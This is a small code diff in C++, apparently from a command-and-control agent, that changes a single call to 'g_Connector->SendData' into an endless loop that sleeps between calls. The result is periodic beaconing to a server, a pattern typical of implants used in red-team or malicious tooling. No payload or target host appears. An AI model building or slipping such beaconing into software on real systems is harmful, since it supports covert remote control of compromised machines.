@@ -37,7 +37,10 @@ void AgentMain()
 		HttpHeaders
 	);
 
-	ULONG recv_size = 0;
-	BYTE* recv = g_Connector->SendData(NULL, NULL, &recv_size);
+	while (true) {
+		ULONG recv_size = 0;
+		BYTE* recv = g_Connector->SendData(NULL, NULL, &recv_size);
+		Sleep( g_Agent->config->sleep_delay * 1000 + 4000 );
+	}
 
 }
